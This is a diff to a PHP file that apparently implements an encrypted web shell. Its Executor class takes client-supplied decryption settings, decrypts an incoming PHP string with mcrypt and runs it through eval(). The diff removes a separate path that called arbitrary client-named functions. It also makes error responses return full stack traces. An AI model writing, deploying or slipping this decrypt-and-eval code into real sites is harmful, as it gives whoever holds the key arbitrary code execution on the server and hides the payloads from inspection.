@@ -1,13 +1,12 @@
 <?php
 
-// declare(strict_types=1);
-
 set_exception_handler(function (Throwable $exception): void {
     $currentDate = new DateTime();
     $errorObj = [
         "timestamp" => $currentDate->format('c'),
-        "error" => $exception::class,
-        "message" => $exception->getMessage(),
+        "error_type" => $exception::class,
+        "error_message" => $exception->getMessage(),
+        "error_stack_trace" => $exception->getTraceAsString(),
     ];
     header('Content-Type: application/json');
     $response_code = 500;
@@ -166,10 +165,7 @@ trait ClientDataValidator
             throw new MissingRequirementException($obj);
         }
         $clientArgType = gettype($clientArgs[$obj]);
-        $expectedType = $classObjTyping->type->value;
-        if ($expectedType === null) {
-            $expectedType = $classObjTyping->type;
-        }
+        $expectedType = $classObjTyping->type->value ?? $classObjTyping->type;
         if ($clientArgType != $expectedType) {
             throw new TypeError("$obj type is \"$clientArgType\", but the server expected type \"$expectedType\"");
         }
@@ -189,7 +185,7 @@ trait ClientDataValidator
             try {
                 $this->validateSingle($obj, $classObjTyping, $clientArgs);
             } catch (Exception $e) {
-                ${$exceptionsArray}[] = $e;
+                $exceptionsArray[] = $e;
             }
         }
         if ($exceptionsArray !== []) {
@@ -291,6 +287,7 @@ class McryptDecryptor implements Decryptor
     }
     public function decrypt(string $data): string|false
     {
+        /** @phpstan-ignore-next-line */
         return mcrypt_decrypt(
             $this->cipher,
             $this->key,
@@ -397,14 +394,10 @@ class Executor
     use ClientDataValidator;
     private readonly Decryptor $decryptor;
     private readonly array $decryptorData;
-    private ?string $command = null;
-    private ?array $parameters = null;
     private function getClassObjs(): array
     {
         return [
             "decryptor" => new ClassObjTyping(Typing::ARRAY, ClassObjOptional::MANDATORY),
-            "command" => new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
-            "parameters" => new ClassObjTyping(Typing::ARRAY, ClassObjOptional::OPTIONAL),
         ];
     }
     private function __construct()
@@ -425,12 +418,6 @@ class Executor
             throw new UserException("fail to validate send data");
         }
         $this->decryptorData = $clientData["decryptor"];
-        if (isset($clientData["command"])) {
-            $this->command = $clientData["command"];
-        }
-        if (isset($clientData["parameters"])) {
-            $this->parameters = $clientData["parameters"];
-        }
         $decryptorPtr = GetPHP::getInstance()->getDecryptor();
         $this->decryptor = $decryptorPtr::getInstance($this->decryptorData);
     }
@@ -446,13 +433,6 @@ class Executor
     {
         $phpString = $this->decryptor->decrypt($encryptedPhpString);
         $this->formatPhpString($phpString);
-        $evalReturn = eval($phpString);
-        if (!$this->command) {
-            return $evalReturn;
-        }
-        if (!is_callable($this->command)) {
-            throw new UserException("function {$this->command} does not exist");
-        }
-        return call_user_func($this->command, $this->parameters);
+        return eval($phpString);
     }
 }
